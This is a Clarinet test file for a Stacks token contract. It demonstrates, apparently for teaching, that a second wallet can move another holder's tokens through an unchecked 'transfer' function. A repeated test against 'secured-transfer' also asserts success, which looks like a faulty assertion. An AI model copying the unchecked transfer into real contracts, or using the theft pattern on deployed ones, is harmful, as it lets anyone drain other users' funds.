
import { Clarinet, Tx, Chain, Account, types } from 'https://deno.land/x/clarinet@v0.14.0/index.ts';
import { assertEquals } from 'https://deno.land/std@0.90.0/testing/asserts.ts';

Clarinet.test({
    name: "I can steal your tokens...",
    async fn(chain: Chain, accounts: Map<string, Account>) {
        const deployer = accounts.get("deployer")!;
        const whaleWallet = accounts.get("wallet_1")!;
        const thiefWallet = accounts.get("wallet_2")!;

        const amount = 100000;

        console.log();
        console.info("First let's we have to give some tokens to whaleWallet...")
        let block = chain.mineBlock([
            Tx.contractCall(
                "token", 
                "mint", 
                [
                    types.uint(amount), 
                    types.principal(whaleWallet.address)
                ],
                 deployer.address
            )
        ]);
        block.receipts[0].result.expectOk();

        console.table(block.receipts[0].events[0])

        console.log();
        console.info("And now we gonna steal it from it...")
        block = chain.mineBlock([
            Tx.contractCall(
                "token", 
                "transfer", 
                [
                    types.uint(amount),
                    types.principal(whaleWallet.address),
                    types.principal(thiefWallet.address)
                ],
                thiefWallet.address
            )
        ]);
        block.receipts[0].result.expectOk();

        console.table(block.receipts[0].events[0])
    },
});


Clarinet.test({
    name: "I can steal your tokens...",
    async fn(chain: Chain, accounts: Map<string, Account>) {
        const deployer = accounts.get("deployer")!;
        const whaleWallet = accounts.get("wallet_1")!;
        const thiefWallet = accounts.get("wallet_2")!;

        const amount = 100000;

        console.log();
        console.info("First let's we have to give some tokens to whaleWallet...")
        let block = chain.mineBlock([
            Tx.contractCall(
                "token", 
                "mint", 
                [
                    types.uint(amount), 
                    types.principal(whaleWallet.address)
                ],
                 deployer.address
            )
        ]);

        console.table(block.receipts[0].events[0])

        console.log();
        console.info("And now we gonna steal it from it...")
        block = chain.mineBlock([
            Tx.contractCall(
                "token", 
                "secured-transfer", 
                [
                    types.uint(amount),
                    types.principal(whaleWallet.address),
                    types.principal(thiefWallet.address)
                ],
                thiefWallet.address
            )
        ]);
        block.receipts[0].result.expectOk();

        console.table(block.receipts[0].events[0])
    },
});